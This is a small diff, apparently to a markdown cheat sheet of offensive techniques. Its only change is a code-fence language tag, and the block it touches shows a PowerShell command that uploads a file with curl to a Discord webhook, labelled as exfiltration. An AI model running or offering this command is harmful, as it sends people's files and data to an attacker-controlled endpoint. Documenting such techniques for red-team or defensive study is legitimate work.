@@ -296,7 +296,7 @@ foreach ($chunk in $chunks) {
     <li>Exfiltrate File using curl to Discord Webhook:</li>
   </ul>
 
-```
+```powershell
 $discordWebhook = '%WEBHOOK%'
 curl.exe -F "file1=@%FILENAME%" $discordWebhook
 ```
